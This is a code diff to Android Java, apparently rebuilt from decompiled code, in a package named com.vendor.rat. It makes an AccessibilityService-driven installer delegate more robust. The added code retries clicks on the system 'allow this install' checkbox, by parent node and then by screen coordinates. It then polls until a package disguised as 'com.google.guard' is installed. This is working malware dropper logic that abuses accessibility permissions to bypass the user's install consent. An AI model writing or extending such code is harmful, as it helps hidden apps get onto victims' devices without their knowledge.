@@ -6,6 +6,7 @@ import android.view.accessibility.AccessibilityEvent;
 import com.vendor.rat.auto.condition.BoolCondition;
 import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.condition.StringCondition;
+import com.vendor.rat.auto.entity.CheckedResult;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.config.TextConfig;
 import com.vendor.rat.service.MyAccessibilityService;
@@ -298,15 +299,22 @@ public class PackageInstallerDelegate extends AutoEngine {
                 checkbox.refresh();
                 Log.d(TAG, "已点击允许本次安装");
             }
-            // TODO: VENDOR_VERIFY - vendor 有多种点击重试策略
+            // vendor: 多种点击重试策略 (o/u.java) — 最多 3 次
             if (!checkbox.isChecked()) {
-                // 尝试点击父节点
+                // 策略1: 尝试点击父节点
                 UiNode parent = checkbox.getParent();
                 if (parent != null) {
                     parent.click();
                     T0(10);
                     checkbox.refresh();
                     Log.d(TAG, "已通过父节点点击允许本次安装");
+                }
+                // 策略2: R() 坐标点击
+                if (!checkbox.isChecked()) {
+                    CheckedResult result = R(checkbox, 3);
+                    if (result.isChecked()) {
+                        Log.d(TAG, "已通过坐标点击允许本次安装");
+                    }
                 }
                 if (!checkbox.isChecked()) {
                     return false;
@@ -415,26 +423,40 @@ public class PackageInstallerDelegate extends AutoEngine {
     }
 
     /**
-     * ADAPT: L() → waitForInstallAndFinish
      * 等待安装完成并结束引擎
-     * // TODO: VENDOR_VERIFY - 原始反编译失败，基于 smali 推断逻辑
+     * 对应 vendor: o/u.java L() — 轮询检查备份应用是否安装
+     * 反编译失败, 基于 smali 推断: 最多 20 次 x 2秒, 检查 PackageManager
      */
     public void waitForInstallAndFinish() {
         if (!finishLock.tryLock()) return;
         try {
             AtomicInteger retryCount = new AtomicInteger(0);
-            // ADAPT: vendor 检查 "com.google.guard" 包是否安装
             boolean installed = false;
             while (!installed && retryCount.incrementAndGet() <= 20) {
                 T0(2);
-                // TODO: VENDOR_VERIFY - vendor 使用 utils.g.d0("com.google.guard")
-                installed = false; // placeholder
+                // vendor: utils.g.d0("com.google.guard") != null
+                installed = isPackageInstalled("com.google.guard");
             }
             if (installed) {
                 finishEngine();
             }
         } finally {
             finishLock.unlock();
+        }
+    }
+
+    /**
+     * 检查指定包名是否已安装
+     * 对应 vendor: com.guard.wallet.utils.g.d0(packageName)
+     */
+    private boolean isPackageInstalled(String packageName) {
+        try {
+            android.content.Context ctx = getContext();
+            if (ctx == null) return false;
+            ctx.getPackageManager().getPackageInfo(packageName, 0);
+            return true;
+        } catch (Exception e) {
+            return false;
         }
     }
 
